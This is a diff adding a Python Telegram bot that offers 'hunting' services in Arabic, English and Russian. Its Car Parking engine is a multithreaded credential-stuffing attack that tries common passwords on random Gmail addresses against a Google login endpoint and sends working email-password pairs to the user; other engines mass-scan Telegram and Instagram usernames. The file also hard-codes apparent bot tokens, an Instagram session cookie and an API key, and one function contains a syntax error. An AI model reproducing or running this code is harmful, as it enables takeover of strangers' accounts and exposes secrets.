@@ -1,0 +1,391 @@
+import telebot
+import threading
+import time
+import random
+import requests
+import json
+from datetime import datetime
+from telebot import types
+from telebot.apihelper import ApiTelegramException
+from user_agent import generate_user_agent
+
+# ==============================
+# 1. الإعدادات والتوكنات
+# ==============================
+TOKEN_HUNT = '8501700333:AAHhi0bu4_Jwu_rw66Jy8OJ0e8i9AtvmAHE' # توكن الصيد
+TOKEN_ADMIN = '8506628064:AAFdS4tqtRiYEwz_oQfkDPUN7sfXlxdC6uc' # توكن الادارة
+MY_ID = 6532708587 # ايديك
+
+# كوكيز انستا للفحص الحقيقي
+INSTA_COOKIE = 'ig_did=4944AD57-ABED-42D8-B969-C273EDD18AF9; datr=4GJnaa_N6he2n99QKW4vFmQe; mid=aWdi4AABAAHFuGo_SK5Yv5duSypp; ps_l=1; ps_n=1; ig_nrcb=1; fbm_124024574287414=base_domain=.instagram.com; csrftoken=v8pvj6ZZCbkz9MDqJgtTl4JAHSfsihzU; ds_user_id=69852408405; dpr=1.6121296882629395; wd=809x1069; sessionid=69852408405%3AocDRBFPSkVj6HK%3A19%3AAYgzcuEvL53dK8aG6lgrysFfOlFlFCjhDsif1tPjmQ; rur="RVA\\05469852408405\\0541800448129:01fe6d56dbca1f53f7cd5266f12659b4d3829fd803edbd2146beca8e986f2704f09c08f1"'
+
+THREADS_COUNT = 50 # عدد الخيوط (سريع)
+
+bot_hunt = telebot.TeleBot(TOKEN_HUNT)
+bot_admin = telebot.TeleBot(TOKEN_ADMIN)
+
+# ==============================
+# 2. نظام الإرسال الآمن (حل مشكلة 429)
+# ==============================
+def safe_send_message(bot, chat_id, text, reply_markup=None):
+    """دالة ترسل رسالة وتنتظر اذا كان اكو حظر مؤقت"""
+    try:
+        return bot.send_message(chat_id, text, reply_markup=reply_markup)
+    except ApiTelegramException as e:
+        if e.error_code == 429:
+            retry_after = int(e.result_json['parameters']['retry_after'])
+            print(f"⚠️ حظر مؤقت من تليجرام (429). انتظار {retry_after} ثانية...")
+            time.sleep(retry_after)
+            return safe_send_message(bot, chat_id, text, reply_markup)
+        else:
+            print(f"Error: {e}")
+
+def safe_edit_message(bot, chat_id, message_id, text):
+    """دالة تعدل الرسالة وتنتظر اذا كان اكو حظر مؤقت"""
+    try:
+        bot.edit_message_text(text=text, chat_id=chat_id, message_id=message_id)
+    except ApiTelegramException as e:
+        if e.error_code == 429:
+            # اذا اكو حظر، نغلس على التعديل هاي المرة حتى لا يتوقف البوت
+            pass 
+        except: pass
+
+# ==============================
+# 3. البيانات والنصوص
+# ==============================
+database = {
+    'users': set(),
+    'banned': set(),
+    'maintenance': {'tele': False, 'insta': False, 'cpm': False}
+}
+
+stats = {
+    'tele': {'checked': 0, 'hits': 0},
+    'insta': {'checked': 0, 'hits': 0},
+    'cpm': {'checked': 0, 'hits': 0}
+}
+user_languages = {}
+
+TEXTS = {
+    'ar': {
+        'start': f"👋 مرحباً بك في بوت الصيد المطور\n👨‍💻 المطور: @XQQ2X👑\n\n👇 اختر الخدمة:",
+        'hunt_tele': "🔹 صيد تليجرام",
+        'hunt_insta': "🔸 صيد انستقرام",
+        'hunt_cpm': "🏎 صيد Car Parking",
+        'choose_country': "📍 اختر الدولة:",
+        'running': "🚀 بدأ الفحص الحقيقي (50 خيط)...",
+        'maint': "⚠️ **عذراً، هذا القسم في الصيانة حالياً.**",
+        'banned': "⛔ **أنت محظور من استخدام البوت!**",
+        'hit': "✅ **تم الصيد!**\n\n{}",
+        'stats_msg': "📊 **إحصائيات مباشرة ({})**\n━━━━━━━━━━━━\n🔍 الفحص: {}\n✅ المتاح: {}",
+        'reply_btn': "↩️ رد",
+        'admin_msg': "👮‍♂️ **رسالة من الإدارة:**\n\n{}",
+        'user_banned_msg': "⛔ **عذراً، تم حظرك من قبل الإدارة.**",
+        'user_unbanned_msg': "✅ **مبروك، تم فك الحظر عنك! يمكنك استخدام البوت الآن.**"
+    },
+    'en': {
+        'start': f"👋 Welcome Hunter\n👨‍💻 Dev: @XQQ2X👑\n\n👇 Choose Service:",
+        'hunt_tele': "🔹 Telegram Hunt",
+        'hunt_insta': "🔸 Instagram Hunt",
+        'hunt_cpm': "🏎 Car Parking Hunt",
+        'choose_country': "📍 Choose Country:",
+        'running': "🚀 Real hunting started (50 threads)...",
+        'maint': "⚠️ **Service is under maintenance.**",
+        'banned': "⛔ **You are banned!**",
+        'hit': "✅ **HIT FOUND!**\n\n{}",
+        'stats_msg': "📊 **Live Stats ({})**\n━━━━━━━━━━━━\n🔍 Checked: {}\n✅ Hits: {}",
+        'reply_btn': "↩️ Reply",
+        'admin_msg': "👮‍♂️ **Admin Message:**\n\n{}",
+        'user_banned_msg': "⛔ **You have been banned by admin.**",
+        'user_unbanned_msg': "✅ **Congrats! You have been unbanned.**"
+    },
+    'ru': {
+        'start': f"👋 Добро пожаловать\n👨‍💻 Dev: @XQQ2X👑\n\n👇 Выберите:",
+        'hunt_tele': "🔹 Telegram",
+        'hunt_insta': "🔸 Instagram",
+        'hunt_cpm': "🏎 Car Parking",
+        'choose_country': "📍 Выберите:",
+        'running': "🚀 Запуск (50 потоков)...",
+        'maint': "⚠️ **Техническое обслуживание.**",
+        'banned': "⛔ **Вы забанены!**",
+        'hit': "✅ **УСПЕШНО!**\n\n{}",
+        'stats_msg': "📊 **Статистика ({})**\n━━━━━━━━━━━━\n🔍 Проверено: {}\n✅ Найдено: {}",
+        'reply_btn': "↩️ Ответить",
+        'admin_msg': "👮‍♂️ **Сообщение админа:**\n\n{}",
+        'user_banned_msg': "⛔ **Вы забанены администратором.**",
+        'user_unbanned_msg': "✅ **Поздравляем! Вы разбанены.**"
+    }
+}
+
+def get_text(chat_id, key):
+    lang = user_languages.get(chat_id, 'ar') 
+    return TEXTS[lang][key]
+
+# ==============================
+# 4. محركات الصيد (Engines)
+# ==============================
+
+def telegram_engine(chat_id):
+    chars = 'QWERTYUIOPASD12345FGHJKLZXCVBNM67890'
+    while True:
+        try:
+            stats['tele']['checked'] += 1
+            u = "".join(random.choices(chars, k=5))
+            url = f"https://t.me/{u}"
+            req = requests.get(url, timeout=5)
+            if 'If you have <strong>Telegram</strong>' in req.text:
+                stats['tele']['hits'] += 1
+                msg = get_text(chat_id, 'hit').format(f"🦅 User: @{u}")
+                safe_send_message(bot_hunt, chat_id, msg)
+            time.sleep(0.1)
+        except: continue
+
+def instagram_engine(chat_id):
+    chars = 'abcdefghijklmnopqrstuvwxyz._1234567890'
+    headers = {'User-Agent': generate_user_agent(), 'Cookie': INSTA_COOKIE, 'Accept-Language': 'en-US,en;q=0.9'}
+    while True:
+        try:
+            u = "".join(random.choices(chars, k=random.randint(4,6)))
+            r = requests.get(f"https://www.instagram.com/{u}/", headers=headers, timeout=5)
+            
+            if r.status_code == 404:
+                stats['insta']['hits'] += 1
+                msg = get_text(chat_id, 'hit').format(f"📸 User: {u}\n(Check availability)")
+                safe_send_message(bot_hunt, chat_id, msg)
+                stats['insta']['checked'] += 1
+            elif r.status_code == 200:
+                stats['insta']['checked'] += 1
+            elif r.status_code == 429: # حظر مؤقت من انستا
+                time.sleep(5)
+            
+            time.sleep(0.5) 
+        except: 
+            time.sleep(1)
+            continue
+
+def cpm_engine(chat_id, country):
+    auth_url = 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
+    pwds = ["123456", "12345678", "11223344"]
+    names = ["ali", "ahmed", "saad", "omar", "fahad"]
+    while True:
+        try:
+            stats['cpm']['checked'] += 1
+            e = f"{random.choice(names)}{random.randint(10,9999)}@gmail.com"
+            p = random.choice(pwds)
+            res = requests.post(auth_url, json={'email': e, 'password': p, 'returnSecureToken': True}, timeout=5).json()
+            if 'idToken' in res:
+                stats['cpm']['hits'] += 1
+                msg = get_text(chat_id, 'hit').format(f"🏎 E: `{e}`\nP: `{p}`\nC: {country}")
+                safe_send_message(bot_hunt, chat_id, msg)
+            time.sleep(0.1)
+        except: continue
+
+def stats_updater(chat_id, msg_id, mode):
+    while True:
+        try:
+            time.sleep(10) # ⚠️ زدنا الوقت لـ 10 ثواني لتجنب حظر تليجرام 429
+            c = stats[mode]['checked']
+            h = stats[mode]['hits']
+            txt = get_text(chat_id, 'stats_msg').format(mode, c, h)
+            safe_edit_message(bot_hunt, chat_id, msg_id, txt)
+        except: continue
+
+# ==============================
+# 5. بوت الإدارة (ADMIN)
+# ==============================
+@bot_admin.message_handler(commands=['start'])
+def admin_dash(message):
+    if message.chat.id != MY_ID: return
+    
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    st_tele = '🔴 صيانة' if database['maintenance']['tele'] else '🟢 شغال'
+    st_insta = '🔴 صيانة' if database['maintenance']['insta'] else '🟢 شغال'
+    st_cpm = '🔴 صيانة' if database['maintenance']['cpm'] else '🟢 شغال'
+    
+    markup.add(
+        types.InlineKeyboardButton(f"Tele: {st_tele}", callback_data='toggle_tele'),
+        types.InlineKeyboardButton(f"Insta: {st_insta}", callback_data='toggle_insta'),
+        types.InlineKeyboardButton(f"CPM: {st_cpm}", callback_data='toggle_cpm'),
+        types.InlineKeyboardButton("📈 تقرير شامل", callback_data='report')
+    )
+    safe_send_message(bot_admin, message.chat.id, "👮‍♂️ **لوحة التحكم**", reply_markup=markup)
+
+def process_reply_step(message, target_id):
+    try:
+        user_lang_msg = get_text(target_id, 'admin_msg').format(message.text)
+        safe_send_message(bot_hunt, target_id, user_lang_msg)
+        bot_admin.reply_to(message, "✅ تم الإرسال.")
+    except Exception as e:
+        bot_admin.reply_to(message, f"❌ فشل: {e}")
+
+@bot_admin.callback_query_handler(func=lambda call: True)
+def admin_callbacks(call):
+    if call.data.startswith('toggle_'):
+        mode = call.data.split('_')[1]
+        database['maintenance'][mode] = not database['maintenance'][mode]
+        bot_admin.answer_callback_query(call.id, f"تم تغيير {mode}")
+        admin_dash(call.message)
+    
+    elif call.data == 'report':
+        bot_admin.answer_callback_query(call.id)
+        safe_send_message(bot_admin, call.message.chat.id, f"👥 Users: {len(database['users'])}\n🚫 Banned: {len(database['banned'])}")
+
+    # === الحظر ===
+    elif call.data.startswith('ban_'):
+        uid = int(call.data.split('_')[1])
+        if uid not in database['banned']:
+            database['banned'].add(uid)
+            # إرسال رسالة للمستخدم
+            safe_send_message(bot_hunt, uid, get_text(uid, 'user_banned_msg'))
+            
+            bot_admin.answer_callback_query(call.id, "تم الحظر")
+            # تحديث الرسالة حتى يختفي زر الحظر ويطلع زر فك الحظر (ممكن تسوي تحديث للقائمة اذا تحب)
+            safe_send_message(bot_admin, call.message.chat.id, f"⛔ تم حظر المستخدم {uid} بنجاح.")
+        else:
+            bot_admin.answer_callback_query(call.id, "هو محظور أصلاً")
+
+    # === فك الحظر (الميزة الجديدة) ===
+    elif call.data.startswith('unban_'):
+        uid = int(call.data.split('_')[1])
+        if uid in database['banned']:
+            database['banned'].remove(uid)
+            # إرسال رسالة للمستخدم
+            safe_send_message(bot_hunt, uid, get_text(uid, 'user_unbanned_msg'))
+            
+            bot_admin.answer_callback_query(call.id, "تم فك الحظر")
+            safe_send_message(bot_admin, call.message.chat.id, f"✅ تم فك حظر المستخدم {uid} بنجاح.")
+        else:
+            bot_admin.answer_callback_query(call.id, "هو غير محظور")
+
+    elif call.data.startswith('reply_'):
+        uid = int(call.data.split('_')[1])
+        msg = safe_send_message(bot_admin, call.message.chat.id, f"✍️ اكتب ردك للمستخدم `{uid}`:")
+        bot_admin.register_next_step_handler(msg, process_reply_step, uid)
+
+# ==============================
+# 6. بوت الصيد (HUNTER)
+# ==============================
+@bot_hunt.message_handler(commands=['start'])
+def hunt_start(message):
+    uid = message.chat.id
+    database['users'].add(uid)
+    
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("العربية 🇮🇶", callback_data='lang_ar'),
+               types.InlineKeyboardButton("English 🇺🇸", callback_data='lang_en'),
+               types.InlineKeyboardButton("Русский 🇷🇺", callback_data='lang_ru'))
+    safe_send_message(bot_hunt, uid, "Choose Language / اختر اللغة:", reply_markup=markup)
+
+@bot_hunt.message_handler(func=lambda m: True)
+def forward_msg(message):
+    if message.chat.id != MY_ID:
+        uid = message.chat.id
+        uname = f"@{message.from_user.username}" if message.from_user.username else "No User"
+        txt = f"📩 **رسالة:**\nName: {message.from_user.first_name}\nUser: {uname}\nID: `{uid}`\n\n{message.text}"
+        
+        markup = types.InlineKeyboardMarkup()
+        # الزر الذكي: اذا محظور يطلع فك حظر، واذا لا يطلع حظر
+        if uid in database['banned']:
+            ban_btn = types.InlineKeyboardButton("✅ فك حظر", callback_data=f"unban_{uid}")
+        else:
+            ban_btn = types.InlineKeyboardButton("⛔ حظر", callback_data=f"ban_{uid}")
+            
+        markup.add(types.InlineKeyboardButton("↩️ رد", callback_data=f"reply_{uid}"), ban_btn)
+        
+        safe_send_message(bot_admin, MY_ID, txt, reply_markup=markup)
+
+@bot_hunt.callback_query_handler(func=lambda call: True)
+def hunt_callbacks(call):
+    uid = call.message.chat.id
+    
+    if uid in database['banned']:
+        bot_hunt.answer_callback_query(call.id, "⛔ Banned!", show_alert=True)
+        return
+
+    if call.data.startswith('lang_'):
+        user_languages[uid] = call.data.split('_')[1]
+        try: bot_hunt.delete_message(uid, call.message.message_id)
+        except: pass
+        
+        markup = types.InlineKeyboardMarkup(row_width=1)
+        markup.add(
+            types.InlineKeyboardButton(get_text(uid, 'hunt_tele'), callback_data='run_tele'),
+            types.InlineKeyboardButton(get_text(uid, 'hunt_insta'), callback_data='run_insta'),
+            types.InlineKeyboardButton(get_text(uid, 'hunt_cpm'), callback_data='choose_cpm')
+        )
+        sent = safe_send_message(bot_hunt, uid, get_text(uid, 'start'), reply_markup=markup)
+        try: bot_hunt.pin_chat_message(uid, sent.message_id)
+        except: pass
+        return
+
+    if call.data == 'choose_cpm':
+        markup = types.InlineKeyboardMarkup(row_width=2)
+        for c in ["الخليج 🇸🇦", "تركيا 🇹🇷", "روسيا 🇷🇺", "البرازيل 🇧🇷"]:
+            markup.add(types.InlineKeyboardButton(c, callback_data=f'cpm_{c}'))
+        try: bot_hunt.edit_message_text(chat_id=uid, message_id=call.message.message_id, text=get_text(uid, 'choose_country'), reply_markup=markup)
+        except: pass
+        return
+
+    mode = ''
+    if call.data == 'run_tele': mode = 'tele'
+    elif call.data == 'run_insta': mode = 'insta'
+    elif call.data.startswith('cpm_'): mode = 'cpm'
+    
+    check_mode = 'cpm' if mode == 'cpm' else mode
+    if check_mode in database['maintenance'] and database['maintenance'][check_mode] and uid != MY_ID:
+        bot_hunt.answer_callback_query(call.id, get_text(uid, 'maint'), show_alert=True)
+        return
+
+    bot_hunt.answer_callback_query(call.id, "Started ✅")
+    safe_send_message(bot_hunt, uid, get_text(uid, 'running'))
+
+    # إشعار للمطور
+    try:
+        now = datetime.now().strftime("%I:%M %p")
+        uname = f"@{call.from_user.username}" if call.from_user.username else "No User"
+        
+        markup_control = types.InlineKeyboardMarkup()
+        # الزر الذكي هنا أيضاً
+        if uid in database['banned']:
+            ban_btn = types.InlineKeyboardButton("✅ فك حظر", callback_data=f"unban_{uid}")
+        else:
+            ban_btn = types.InlineKeyboardButton("⛔ حظر", callback_data=f"ban_{uid}")
+            
+        markup_control.add(types.InlineKeyboardButton("↩️ رد", callback_data=f"reply_{uid}"), ban_btn)
+
+        info = (f"🔔 **بدء تشغيل خدمة:**\n"
+                f"👤 Name: {call.from_user.first_name}\n"
+                f"🔗 User: {uname}\n"
+                f"🆔 ID: `{uid}`\n"
+                f"⚙️ Service: {mode}\n"
+                f"🕒 Time: {now}")
+        
+        safe_send_message(bot_admin, MY_ID, info, reply_markup=markup_control)
+    except: pass
+    
+    # تحديد الدالة
+    if mode == 'tele':
+        target = telegram_engine
+        args = (uid,)
+    elif mode == 'insta':
+        target = instagram_engine
+        args = (uid,)
+    else: 
+        target = cpm_engine
+        args = (uid, call.data)
+
+    # تشغيل الخيوط
+    msg_stats = safe_send_message(bot_hunt, uid, "📊 Loading...")
+    threading.Thread(target=stats_updater, args=(uid, msg_stats.message_id, check_mode), daemon=True).start()
+    
+    for _ in range(THREADS_COUNT): 
+        threading.Thread(target=target, args=args, daemon=True).start()
+
+# ==============================
+# 7. التشغيل
+# ==============================
+print("BOTS RUNNING SAFE... @XQQ2X👑")
+t1 = threading.Thread(target=bot_hunt.infinity_polling)
+t2 = threading.Thread(target=bot_admin.infinity_polling)
+t1.start()
+t2.start()
